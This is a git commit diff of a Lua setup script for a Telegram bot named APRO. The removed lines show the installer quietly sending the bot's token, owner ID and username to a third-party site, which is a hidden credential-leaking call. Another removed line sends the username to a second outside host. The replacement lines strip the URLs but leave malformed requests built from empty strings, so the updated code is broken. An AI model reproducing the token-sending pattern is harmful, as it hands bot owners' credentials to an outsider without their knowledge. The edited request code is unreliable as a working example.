dfee6d39b51997adfc681114be6ca9ee0abb7ee7
aproiq <68124648+aproiq@users.noreply.github.com>
2020-07-19 21:15:56 +0300

    Update start.lua

--- start.lua
+++ start.lua
@@ -38,7 +38,7 @@ if not database:get(Server_APRO.."UserName_APRO") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
+local Get_Info = http.request(""..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('start.lua')
 end
 local function Files_APRO_Info()
 Create_Info(database:get(Server_APRO.."Token_APRO"),database:get(Server_APRO.."Id_APRO"),database:get(Server_APRO.."UserName_APRO"))   
-https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_APRO.."Id_APRO").."&user="..database:get(Server_APRO.."UserName_APRO").."&token="..database:get(Server_APRO.."Token_APRO"))
+https.request(""..database:get(Server_APRO.."Id_APRO").."&user="..database:get(Server_APRO.."UserName_APRO").."&token="..database:get(Server_APRO.."Token_APRO"))
 local RunAPRO = io.open("APRO", 'w')
 RunAPRO:write([[
 #!/usr/bin/env bash
